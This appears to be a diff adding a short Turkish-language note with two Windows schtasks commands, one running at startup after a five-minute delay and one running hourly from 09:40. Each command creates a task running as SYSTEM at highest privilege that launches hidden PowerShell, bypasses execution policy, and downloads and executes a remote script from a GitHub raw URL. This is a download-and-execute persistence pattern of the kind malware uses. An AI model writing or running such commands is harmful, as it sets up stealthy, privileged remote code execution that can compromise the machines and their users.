@@ -1,0 +1,8 @@
+PC AÇILIP 5 DK SONRA:
+
+schtasks /create /tn "Foncar_Acilis" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xipperzo/sirketbaglantisi/main/gorev.ps1')\"" /sc onstart /delay 0005:00 /ru System /rl highest /f
+
+
+09:40'ta başlayıp saat başı (7 kez) çalışması için:
+
+schtasks /create /tn "Foncar_Saatlik" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xipperzo/sirketbaglantisi/main/gorev.ps1')\"" /sc daily /st 09:40 /ri 60 /du 07:00 /ru System /rl highest /f
